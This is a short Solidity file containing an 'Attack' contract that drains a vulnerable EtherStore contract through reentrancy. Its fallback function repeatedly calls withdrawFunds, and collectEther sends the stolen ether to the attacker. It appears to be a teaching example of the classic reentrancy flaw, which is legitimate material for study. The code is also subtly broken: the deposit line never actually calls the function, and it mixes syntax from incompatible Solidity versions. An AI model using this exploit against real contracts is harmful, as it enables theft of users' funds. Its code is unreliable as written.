import "EtherStore.sol";

contract Attack {
    EtherStore public etherStore;

    // initialize the etherStore variable with the contract address
    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    function attackEtherStore() public payable {
        // require enough Ether both for the deposit and for gas
        require(msg.value >= 2 ether);
        // send eth to EtherStore's depositFunds() function
        etherStore.depositFunds.value(1 ether);
        // start the magic
        etherStore.withdrawFunds(1 ether);
    }

    // this function is called by the attacker to withdraw his earned funds
    function collectEther() public {
        // transfer the balance of this contract to the caller (the attacker)
        msg.sender.transfer(this.balance);
    }

    // fallback function - where the magic happens 
    // this is called when the contract is called without any function specified
    // it will be invoked by the vulnerable contract when it will send the withdrawn funds to this contract
    function() payable {
        if (etherStore.balance > 1 ether) {
            etherStore.withdrawFunds(1 ether);
        }
    }
}